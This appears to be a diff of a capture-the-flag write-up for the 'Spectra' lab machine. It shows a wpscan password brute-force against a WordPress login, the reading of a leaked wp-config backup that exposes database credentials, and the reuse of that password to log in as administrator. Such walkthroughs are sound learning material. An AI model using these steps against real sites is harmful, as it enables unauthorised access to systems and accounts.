@@ -41,3 +41,19 @@ PORT     STATE SERVICE          VERSION
 └─# wpscan --url http://10.10.10.229/main
 http://spectra.htb/main/wp-login.php
 └─# wpscan --url http://10.10.10.229/main --passwords /usr/share/wordlists/rockyou.txt --usernames administrator
+
+view-source:http://spectra.htb/testing/wp-config.php.save
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'dev' );
+
+/** MySQL database username */
+define( 'DB_USER', 'devtest' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'devteam01' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+Try to login on http://spectra.htb/main/wp-login.php using administrator : devteam01. This is successful.
+
